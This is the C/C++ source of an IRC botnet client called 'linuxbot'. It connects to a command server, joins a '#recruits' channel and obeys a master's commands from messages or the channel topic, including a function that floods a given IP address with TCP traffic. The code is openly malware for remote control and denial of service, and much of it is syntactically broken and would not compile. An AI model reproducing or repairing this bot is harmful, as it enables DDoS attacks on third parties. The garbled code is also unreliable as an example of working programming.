#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <ctime>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#define MAX_LINE_SIZE 512
#define RECV_BUFFER_SIZE 2048
#define MAX_NICK_SIZE 32
#define MAX_WORDS 32

unsigned long mutex_time = 20000; // msec

int reconnect_time = 5000; // msec
int MaxWaitTime = 30; //sec

unsigned int NickLen = 3;

char OrderPrefix[] = "!";

char Chan[] = "#recruits";
int UseChanPass = 0;
char ChanPass[] = "pass";

int Sock;
bool Connected;

void flood(char addr, int count) {
	int sock, i = 0;
	sockaddr *sa;
	char buf = [MAX_LINE_SIZE];
	sa->sa_family = AF_INET;
	sa->sa_data = addr;
	memset(buf, 1, sizeof(buf));
	do sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
	while (sock < 0);
	while (connect(SOCK_STREAM, sa, sizeof(addr)))continue;
	while (i < count * 100) {
		send(sock, buf, strlen(buf), 0);
		i++;
	}
}

char *GenerateLetterNick(int Len) {

	int r, i;
	char Buffer[] = "abcdefghijklmnopqrstuvwxyz0123456789_-[]^`|{}";

	if (Len == 0) Len = (rand()%5)+5;

	char *Nick = (char*)malloc(Len);

	srand(time(NULL));

	for (i = 0; i < Len; i++) {
		if (i > 0) {
			r = rand()%strlen(Buffer);
			Nick[i] = Buffer[r];
		} else {
			r = rand()%26;
			Nick[i] = r+97;
		}
	}

	Nick[i] = '\0';
	return Nick;
}

void IrcPrivmsg(int Sock, char *channel, char *text)
{
	char buffer[MAX_LINE_SIZE];

	snprintf(buffer, sizeof(buffer), "%s %s :%s\r\n", "PRIVMSG", channel, text);

	send(Sock, buffer, strlen(buffer), 0);

	memset(buffer, 0, sizeof(buffer));
}

int Irc_Parse_Command(char *CurrentChannel, char *Line)
{
	char Buffer[MAX_LINE_SIZE], Hash[128];
	char *a[MAX_WORDS];
	unsigned int i = 0, x = 0;
	bool Silent = 0;

	printf("Command to parse: %s on channel: %s\n", Line, CurrentChannel);

	//Split Line
	a[i] = strtok(Line, " ");
	while (a[i] != NULL) {
		i++;
		if (i > MAX_WORDS)break;
		a[i] = strtok(NULL, " ");
	}

	if (a[0] == NULL)
		return 1;

	//Check for parameters
	i = 1;
	while (a[i] != NULL) {
		if (strcmp(a[i], "-s") == 0)
		{
			x++;
			Silent = 1;
		}
		i++;
	}

		//Version
		if (strcmp(a[0], "v") == 0)
		{
			if (!Silent) IrcPrivmsg(Sock, CurrentChannel,"linuxbot v. 1.0 shoutout to rude_bwoy92");
			return 1;
		}

		//Disconnect, die
		else if (strcmp(a[0], "d") == 0)
		{
			snprintf(Buffer, sizeof(Buffer), "%s :disconnecting\r\n", "QUIT");
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -2;
		}

		//Reconnect, same server
		else if (strcmp(a[0], "r") == 0)
		{
			snprintf(Buffer, sizeof(Buffer), "%s\r\n", "QUIT");
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -3;
		}

		//Reconnect, next server
		else if (strcmp(a[0], "q") == 0)
		
		
		{
			snprintf(Buffer, sizeof(Buffer), "%s\r\n", "QUIT");
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -4;
		}

		//Set nick
		else if (strcmp(a[0], "n") == 0)
		{
			if (a[x+1] != NULL) snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", a[x+1]);
			else snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen));
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		else if (a[x+1] == NULL) return 1;

		//Join channel
		else if (strcmp(a[0], "j") == 0)
		{
			if (a[x+2] != NULL) snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", "JOIN", a[x+1], a[x+2]);
			else snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "JOIN", a[x+1]);
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		//Part channel
		else if (strcmp(a[0], "p") == 0)
		{
			snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "PART", a[x+1]);
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		//flood an ip
		else if (strcmp(a[0], "f") == 0){
			if (strcmp(a[1], NULL) == 1 && strcmp(a[2], NULL) == 1) {
				if (inet_addr(a[1]) != INADDR_NONE) {
					int a;
					try a = std::stoi(a[2]);
					catch return -4;
					flood(a[1], a[2]);
				}
			}
		}

		else if (a[x+2] == NULL) return 1;


		else if (a[x+3] == NULL) return 1;


		else if (a[x+4] == NULL) return 1;


		else if (a[x+5] == NULL) return 1;

		return 1;
}


int Irc_Connect(char *Server, unsigned int Port, bool UsePassword, const char *Password) {//обработка return-а

    //sockaddr_in Peer;

	char Buffer[MAX_LINE_SIZE], Nick[MAX_NICK_SIZE], name[MAX_NICK_SIZE];

	//Peer.sin_family = AF_INET;
	//Peer.sin_port = htons(Port);

	Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Sock < 0) {

		printf("Failed to initialize socket!\n");
		return 0;
	}

	if (UsePassword) {
		snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "PASS", Password);
		send(Sock, Buffer, strlen(Buffer), 0);
	}

	sprintf(Nick, GenerateLetterNick(NickLen));
	sprintf(Buffer, "%s %s\r\n", "NICK", Nick);

	if (send(Sock, Buffer, strlen(Buffer), 0) < 0) {

		printf("Failed to send NICK!\n");
		return 0;
	}
	sprintf(name, "%s", GenerateLetterNick(0));
	sprintf(Buffer, "%s %s \"fo%d.net\" \"lol\" :%s\r\n", "PASS", name, rand()%10, name);

	printf("Sending: %s\n", Buffer);

	if (send(Sock, Buffer, strlen(Buffer), 0) < 0) {

		printf("Failed to send USER!\n");
		return 0;
	}

	return 1;
}


int Irc_Parse(char *Line)
{
	char Buffer[MAX_LINE_SIZE], ParseLine[MAX_LINE_SIZE], ParseLineStatic[MAX_LINE_SIZE];
	char *w[MAX_WORDS];
	unsigned int i = 0;
	int E = 1;

	printf("Parsing %s\n", Line);

	if (Line == NULL) return E;

	//Split line into words
	w[i] = strtok(Line, ": ");
	while (w[i] != NULL) {
		i++;
		if (i > MAX_WORDS)break;
		w[i] = strtok(NULL, ": ");
	}

	//We have received PING, so send back PONG

	if (strcmp(w[0], "PING") == 0) //Ïåðâûé ñèìâîë - ïðîáåë??
	{
		snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "PONG", w[1]);
		send(Sock, Buffer, strlen(Buffer), 0);

		//Let's join the channel
		if (UseChanPass) snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", "JOIN", Chan, ChanPass);
		else snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "JOIN", Chan);

		if (send(Sock, Buffer, strlen(Buffer), 0) < 0) return -1;

		else printf("Joined channel %s\n", Chan);

		memset(Buffer, 0, sizeof(Buffer));
		return 1;
	}

	// MOTD, so we can join the channel
	if (strcmp(w[1], "422") == 0)
	{
		if (UseChanPass) snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", "JOIN", Chan, ChanPass);
		else snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "JOIN", Chan);

		if (send(Sock, Buffer, strlen(Buffer), 0) < 0)return -1;

		else printf("Joined channel %s\n", Chan);
		memset(Buffer, 0, sizeof(Buffer));
	}

	//Nick already in use
	else if (strcmp(w[1], "433") == 0)
	{
		snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen));

		if (send(Sock, Buffer, strlen(Buffer), 0) < 0)return -1;
		else return 1;
	}

	//We receive order from master, lets check his host first!
	else if (strcmp(w[1], "PRIVMSG") == 0 && strncmp(w[3], OrderPrefix, strlen(OrderPrefix)) == 0 && strlen(w[3]) > strlen(OrderPrefix))
	{
			i = 3;
			while (w[i] != NULL)
			{
				//We assume w[i] has prefix, lets get rid of it
				memset(w[i], '\x20', strlen(OrderPrefix));
				sprintf(ParseLine, "");
				while (strncmp(w[i], OrderPrefix, strlen(OrderPrefix)) != 0)
				{
					snprintf(ParseLine, sizeof(ParseLine),"%s %s", ParseLine, w[i]);
					i++;
					if (w[i] == NULL) break;
				}
				E = Irc_Parse_Command(w[2], ParseLine);
				if (E < 1)
					return E;
			}
			return 1;
	}

	else if (w[4] == NULL) return 1;

	//We receive topic, so lets check it and then call function to parse
	else if (strcmp(w[1], "332") == 0 && strncmp(w[4], OrderPrefix, strlen(OrderPrefix)) == 0 && strlen(w[4]) > strlen(OrderPrefix))
	{
		sprintf(ParseLineStatic, "");
		i = 4;
		//If multiple commands set in topic, lets parse them all!
		while (w[i] != NULL)
		{
			//We assume w[i] has prefix, lets get rid of it
			memset(w[i], '\x20', strlen(OrderPrefix));
			sprintf(ParseLine, "");
			while (strncmp(w[i], OrderPrefix, strlen(OrderPrefix)) != 0)
			{
				snprintf(ParseLine, sizeof(ParseLine), "%s %s", ParseLine, w[i]);
				i++;
				if (w[i] == NULL) break;
			}
			E = Irc_Parse_Command(w[3], ParseLine);
			if (E < 1)
				return E;
		}
		return 1;
	}

	return 1;
}



int main()
{
	//Initialization of variables
	char Buffer[RECV_BUFFER_SIZE];
	int Error = 0, len;
	struct timeval tv;
	//fd_set fds;
	int nRetVal;

	Connected = 0;

	//Start loop connecting to servers - if first server fails to connect, lets connect to another one etc...
	tv.tv_sec = MaxWaitTime;
	tv.tv_usec = 0;
	while (1)
	{
		printf("Connecting to %s:%d\n", "192.168.145.1", 6667);

		//Connect to irc server
		if (Irc_Connect("192.168.145.1", 6667, 0, "password"))
		{
			printf("Connection established on %s:%d\n", "192.168.145.1", 6667);

			Connected = 1;
			while (Sock > 0)
			{
				//FD_ZERO(&fds);
				//FD_SET(Sock, &fds);

				len = 0;
				memset(Buffer, 0, sizeof(Buffer));
				while ((nRetVal = select(Sock, &fds, NULL, NULL, &tv)) > 0)
				{
					if (len == RECV_BUFFER_SIZE - 1)break;
					len += recv(Sock, Buffer + len, 1, 0);//
					if (Buffer[len-1] == '\r' || Buffer[len-1] == '\n')break;
				}

				if (nRetVal <= 0)break;
				else if (len < 2)continue;
				else
				{
					Buffer[len-1] = 0;

					Error = Irc_Parse(Buffer);
					switch (Error) {
					//Connection lost
					case -1:
						Connected = 0;
						break;
					//Forced disconnect
					case -2:
						close(Sock);
						return 0;
					//Reconnect to the same server
					case -3:
						close(Sock);
						Connected = 0;
						break;
					default:
						break;
					}
					//Connection with server has been lost! Reconnect!
					if (!Connected) break;
				}

			}
			printf("Disconnected from server.\n");
			close(Sock);
		}
		sleep(reconnect_time);
	}

	//Cleanup
	close(Sock);
	return 0;
}
